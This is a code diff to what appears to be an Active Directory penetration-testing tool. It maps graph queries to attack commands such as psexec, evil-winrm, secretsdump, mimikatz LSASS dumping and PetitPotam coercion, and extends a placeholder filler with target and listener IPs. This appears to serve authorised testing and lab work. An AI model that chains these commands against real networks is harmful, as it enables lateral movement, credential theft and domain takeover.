@@ -531,23 +531,72 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
     # ==================== ATTACK CHAINS ====================
     "chain-shortest-to-da": "BUILD_SEQUENCE",
     "chain-all-paths-to-da": "BUILD_SEQUENCE",
-    "chain-owned-to-pivot-to-da": "BUILD_SEQUENCE",
-    "chain-credential-harvest": "BUILD_SEQUENCE",
+    "chain-owned-to-pivot-to-da": {
+        "commands": ["impacket-psexec", "evil-winrm-shell"],
+        "target_field": "PivotMachine",
+        "target_ip_field": "PivotMachineIP",
+        "user_field": "OwnedUser",
+        "context": "Pivot through machine to harvest DA credentials",
+        "permissions_required": "Owned user with AdminTo on pivot",
+    },
+    "chain-credential-harvest": {
+        "commands": ["secretsdump-sam", "mimikatz-lsass"],
+        "target_field": "TargetMachine",
+        "target_ip_field": "TargetMachineIP",
+        "user_field": "OwnedUser",
+        "context": "Harvest DA credentials from shared admin machine",
+        "permissions_required": "Local admin on target to dump credentials",
+    },
     "chain-complete-compromise": "BUILD_SEQUENCE",
     "chain-lateral-to-privilege": "BUILD_SEQUENCE",
+
+    # ==================== PWNED TRACKING ====================
+    "pwned-machine-access": {
+        "commands": ["impacket-psexec", "impacket-wmiexec", "evil-winrm-shell", "xfreerdp-connect"],
+        "target_field": "Computer",
+        "target_ip_field": "ComputerIP",
+        "user_field": "User",
+        "access_type_field": "AccessType",
+        "context": "Lateral movement to machines accessible by pwned users",
+        "permissions_required": "Pwned user credentials + their access rights",
+    },
+    "pwned-sessions-from-machines": {
+        "commands": ["secretsdump-ntds", "mimikatz-lsass"],
+        "target_field": "TargetMachine",
+        "target_ip_field": "TargetMachineIP",
+        "user_field": "PwnedUser",
+        "context": "Credential harvesting from accessible machines with victim sessions",
+        "permissions_required": "Local admin on target to dump credentials",
+    },
+    "pwned-cred-harvest-targets": {
+        "commands": ["secretsdump-sam", "mimikatz-lsass"],
+        "target_field": "HarvestFrom",
+        "target_ip_field": "HarvestFromIP",
+        "user_field": "Attacker",
+        "context": "High-value credential harvest targets (admincount=true sessions)",
+        "permissions_required": "Local admin on target to dump credentials",
+    },
+    "pwned-lateral-targets": {
+        "commands": ["impacket-psexec", "secretsdump-sam"],
+        "target_field": "TargetMachine",
+        "target_ip_field": "TargetMachineIP",
+        "context": "Next lateral movement targets with non-pwned user sessions",
+        "permissions_required": "Pwned user with admin access to target",
+    },
 
     # ==================== OWNED PRINCIPAL ====================
     "owned-what-can-access": {
         "commands": ["impacket-psexec", "evil-winrm-shell", "xfreerdp-connect"],
         "target_field": "Target",
+        "target_ip_field": "TargetIP",
         "access_type_field": "AccessType",  # Dynamic from query result
         "permissions_required": "Owned user credentials + their access rights",
     },
     "owned-path-to-da": "BUILD_SEQUENCE",
     "owned-first-hop": {
         "commands": ["impacket-psexec", "evil-winrm-shell"],
-        "target_field": "Target",
-        "access_type_field": "AccessType",
+        "target_field": "Computer",
+        "target_ip_field": "ComputerIP",
         "permissions_required": "Owned user credentials + their access rights",
     },
     "owned-admin-on": {
@@ -560,6 +609,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "commands": ["impacket-psexec"],
         "access_type": "HasSession",
         "target_field": "Computer",
+        "target_ip_field": "ComputerIP",
         "context": "Credential harvest from DA session",
         "permissions_required": "Local admin on target to dump creds",
     },
@@ -612,6 +662,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "commands": ["rubeus-monitor", "petitpotam-coerce", "coercer-coerce"],
         "access_type": None,
         "target_field": "Computer",
+        "target_ip_field": "ComputerIP",
         "context": "Non-DC unconstrained - coerce + capture TGT",
         "permissions_required": "Local admin on unconstrained host + coercion capability",
     },
@@ -627,6 +678,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "access_type": "WriteAccountRestrictions",
         "user_field": "Attacker",
         "target_field": "TargetComputer",
+        "target_ip_field": "TargetComputerIP",
         "array_field": "PrivilegedSessions",
         "context": "Full RBCD chain - write + impersonate to cred harvest",
         "permissions_required": "WriteProperty on target + control of computer account",
@@ -636,6 +688,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "access_type": "AddAllowedToAct",
         "user_field": "Attacker",
         "target_field": "TargetComputer",
+        "target_ip_field": "TargetComputerIP",
         "context": "AddAllowedToAct - configure RBCD directly",
         "permissions_required": "AddAllowedToAct permission on target computer",
     },
@@ -813,8 +866,11 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
     "lateral-coerce-to-tgt": {
         "commands": ["petitpotam-coerce", "coercer-coerce", "printerbug-trigger", "dfscoerce-trigger"],
         "access_type": "CoerceToTGT",
-        "user_field": "CoercionHost",
-        "target_field": "CanCaptureTGTFrom",
+        # Coercion commands are special: attacker provides their own creds, CoercionHost is the LISTENER
+        "listener_field": "CoercionHost",       # Unconstrained delegation host (where TGT is captured)
+        "listener_ip_field": "CoercionHostIP",  # Its IP (for <LISTENER_IP> placeholder)
+        "target_field": "CanCaptureTGTFrom",    # What we're coercing (e.g., DC)
+        "is_coercion": True,                    # Flag for special handling in command_suggester
         "context": "Coerce authentication to capture TGT",
         "permissions_required": "Network access to target + listener on unconstrained host",
     },
@@ -849,6 +905,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "access_type": "WriteAccountRestrictions",
         "user_field": "Attacker",
         "target_field": "RBCDTarget",
+        "target_ip_field": "RBCDTargetIP",
         "context": "Configure RBCD on computer",
         "permissions_required": "WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity",
     },
@@ -857,6 +914,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "access_type": "SyncLAPSPassword",
         "user_field": "Principal",
         "array_field": "Computers",
+        "array_ip_field": "ComputerIPs",
         "domain_level": True,
         "context": "Domain-wide LAPS sync rights",
         "permissions_required": "SyncLAPSPassword extended right (domain-wide)",
@@ -866,6 +924,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "access_type": "AddAllowedToAct",
         "user_field": "Attacker",
         "target_field": "RBCDTarget",
+        "target_ip_field": "RBCDTargetIP",
         "context": "AddAllowedToAct - configure RBCD",
         "permissions_required": "AddAllowedToAct extended right on target",
     },
@@ -898,6 +957,7 @@ QUERY_COMMAND_MAPPINGS: Dict[str, Any] = {
         "access_type": "ReadLAPSPassword",
         "user_field": "Attacker",
         "array_field": "Computers",
+        "array_ip_field": "ComputerIPs",
         "context": "Read LAPS password - local admin creds",
         "permissions_required": "Read access to ms-mcs-AdmPwd attribute",
         "post_success": [
@@ -1026,6 +1086,7 @@ def fill_command(
     password: str = "",
     ntlm_hash: str = "",
     cred_value: str = "",
+    listener_ip: str = "",
 ) -> str:
     """
     Universal command placeholder filler with IP preference.
@@ -1034,7 +1095,7 @@ def fill_command(
     Credentials only fill if non-empty string provided.
 
     IP Preference Logic:
-        - If target_ip is provided, use it for <TARGET> and <COMPUTER>
+        - If target_ip is provided, use it for <TARGET>, <COMPUTER>, and <TARGET_IP>
         - Otherwise, fallback to target (FQDN)
         - This allows commands to use IP addresses when available
 
@@ -1048,6 +1109,7 @@ def fill_command(
         password: Password credential (fills <PASSWORD>)
         ntlm_hash: NTLM hash credential (fills <HASH>, <NTLM_HASH>)
         cred_value: Generic credential value (fills <CRED_VALUE>)
+        listener_ip: Listener IP for coercion commands (fills <LISTENER_IP>)
 
     Returns:
         Filled command string
@@ -1067,6 +1129,14 @@ def fill_command(
         ...     target="FILES04.CORP.COM"
         ... )
         'psexec FILES04.CORP.COM'
+
+        >>> # Coercion command with listener
+        >>> fill_command(
+        ...     "petitpotam.py <LISTENER_IP> <TARGET_IP>",
+        ...     target_ip="10.0.0.1",
+        ...     listener_ip="10.0.0.50"
+        ... )
+        'petitpotam.py 10.0.0.50 10.0.0.1'
     """
     result = template
 
@@ -1083,6 +1153,11 @@ def fill_command(
     if effective_target:
         result = result.replace("<TARGET>", effective_target)
         result = result.replace("<COMPUTER>", effective_target)
+        result = result.replace("<TARGET_IP>", effective_target)
+
+    # === Listener placeholder (for coercion commands) ===
+    if listener_ip:
+        result = result.replace("<LISTENER_IP>", listener_ip)
 
     # === Domain placeholders ===
     if domain:
